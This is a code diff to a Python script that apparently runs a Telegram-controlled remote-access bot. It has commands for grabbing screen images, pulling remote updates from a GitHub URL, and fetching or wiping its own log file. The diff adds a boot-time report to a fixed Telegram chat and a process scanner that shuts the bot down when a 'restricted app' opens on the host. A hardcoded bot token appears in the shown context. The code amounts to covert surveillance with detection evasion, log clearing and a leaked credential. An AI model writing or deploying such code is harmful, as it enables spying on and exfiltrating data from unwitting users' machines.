@@ -27,8 +27,8 @@ file=sys.argv[0]
 token="6199318379:AAGmrDxxhYeYWabD8MqyrMMwKvVztDkPhGE"
 #url for online update source
 url="https://raw.githubusercontent.com/Mainakdey1/PythonStuff/main/development_file.py"
-
-
+#delay value(int) for process scanner
+delay=0.0001
 
 
 
@@ -72,20 +72,20 @@ class logger:
     
 
     def info(self,_function_name,_message):
-        import time
+
         log_file=open(self._log_file,"a+")
         log_file.write("\n"+time.ctime()+" at "+str(time.perf_counter_ns())+"    "+_function_name+"   called (local_severity=INFO)with message:  "+_message)
         log_file.close()
 
 
     def warning(self,_function_name,_message):
-        import time
+
         log_file=open(self._log_file,"a+")
         log_file.write("\n"+time.ctime()+" at "+str(time.perf_counter_ns())+"    "+_function_name+"   called (local_severity=WARNING)with message:  "+_message)
         log_file.close()
 
     def critical(self,_function_name,_message):
-        import time
+
         log_file=open(self._log_file,"a+")
         log_file.write("\n"+time.ctime()+" at "+str(time.perf_counter_ns())+"    "+_function_name+"   called (local_severity=CRITICAL)with message:  "+_message)
         log_file.close()
@@ -109,13 +109,9 @@ class logger:
 
 
 
-def end_main_process() -> None:
-    sys.exit()
 
 
-
-
-__version__=1.08
+__version__=1.09
 
 
 
@@ -356,6 +352,10 @@ else:
             logins.warning("FUNC IMAGE_GRAB","FUNCTION NON RESPONSIVE")
 
 
+
+
+
+    #Function definition log file access method. Call /getlogfile to get a text log file of all events logged by the program.
     async def get_log_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         try:
             if not open("logfile.txt","r"):
@@ -366,6 +366,40 @@ else:
         except:
             logins.warning("LOGFILE ACCESS","UNSUCCESSFUL")
 
+
+
+
+
+    #Function definition of clear log file method. Call /clearlogfile to clear the log file of all it's contents.
+    #Caution: Calling this will delete all the previous events recorded by the program.
+    async def clear_log_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+        try:
+            open('logfile.txt','w').close()
+            logins.info("LOGFILE ACCESS","LOGFILE CLEARED")
+        except:
+            logins.warning("LOGFILE ACCESS","LOGFILE COULD NOT BE CLEARED")
+            
+
+
+
+
+
+    #global variable hide, is True if a restricted app is opened by host system.
+    ret={'main_hidev': False}
+    #function to start scanner subprocess
+    def start_subprocess(queue):
+        try:
+            ret=queue.get()
+            logins.info("PROCESS SCANNER","PROCESS SCAN STARTED WITH DELAY "+str(delay) )
+            apr=process_scanner("scA")
+            apr.start_scan(delay)
+            logins.info("PROCESS SCANNER","RESTRICTED APP CALLED, CLOSING MAIN")
+            
+            ret['main_hidev']=True
+            queue.put(ret)
+        
+        except:
+            logins.critical("PROCESS SCANNER","PROCESS SCAN FAILED")
 
 
 
@@ -390,51 +424,69 @@ else:
         application.add_handler(CommandHandler("getupdate",getupdate)) #type /getupdate
         application.add_handler(CommandHandler("sc",image_grab)) #type /sc
         application.add_handler(CommandHandler("getlogfile",get_log_file))
+        application.add_handler(CommandHandler("clearlogfile",clear_log_file))
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, show_message))
 
 
         # Run the bot until the user presses Ctrl-C
         try:
 
+            #Sends a info message informing the user that the host has started the system.
+            btime=datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
+            messageobj=TelegramBot(auth=token,chat_id='820919205',body='The service was started at'+' '+btime)
+            messageobj.send()
+            logins.info("MAIN","COMMAND LINE INITIATED")
+        except:
+            logins.critical("MAIN","UNKNOW ERROR")       
+        try:
+
             application.run_polling()
             logins.info("MAIN","APPLICATION POLLING")
         except:
             logins.critical("MAIN","ERROR OCCURED WHILE ATTEMPTING TO POLL APPLICATION")
-    try:
 
-        btime=datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
-        messageobj=TelegramBot(auth=token,chat_id='820919205',body='The service was started at'+' '+btime)
-        messageobj.send()
-        logins.info("MAIN","COMMAND LINE INITIATED")
-    except:
-        logins.critical("MAIN","UNKNOW ERROR")
 
-    ret={'main_hidev': False}
 
-    def start_subprocess(queue) -> None:
-        ret=queue.get()
-        apr=process_scanner("scA")
-        apr.start_scan(0.001)
-        ret['main_hidev']=True
-        queue.put(ret)
 
 
 
     
+    def end_main_process():
+        sys.exit()
+#MAIN CALLED HERE
 
     if __name__ == "__main__":
-        queue=multiprocessing.Queue()
-        queue.put(ret)
-        p=Process(target=start_subprocess,args=(queue,))
-        p.start()
-        pmain=Process(target=main)
-        pmain.start()
-        p.join()
-        hold_end_variable=queue.get()['main_hidev']
+        try:
+            queue=multiprocessing.Queue()
+            queue.put(ret)
+            #Scanner thread created here
+            p=Process(target=start_subprocess,args=(queue,))
+            try:
 
-        if hold_end_variable==True:
-            pmain.terminate()
-            sys.exit()
+                p.start()
+                logins.info("PROCESS SCANNER","THREAD CREATED")
+            except:
+                logins.critical("PROCESS SCANNER","THREAD CREATION FAILED")
+            try:
+                #main function thread created here.
+                pmain=Process(target=main)
+                pmain.start()
+                logins.info("MAIN","THREAD CREATED")
+
+            except:
+                logins.critical("MAIN","THREAD CREATION FAILED")
+
+
+            #scanner must wait untill either it is terminated by the program itself, or a restricted app is called by the host system.
+            p.join()
+
+            #if global hide value becomes true, end all process threads immediately.
+            if queue.get()['main_hidev']==True:
+                end_main_process()
+        
+        except:
+            logins.critical("MAIN","ERROR OCCURED WHILE INITIATING MAIN")
+
 
 
 
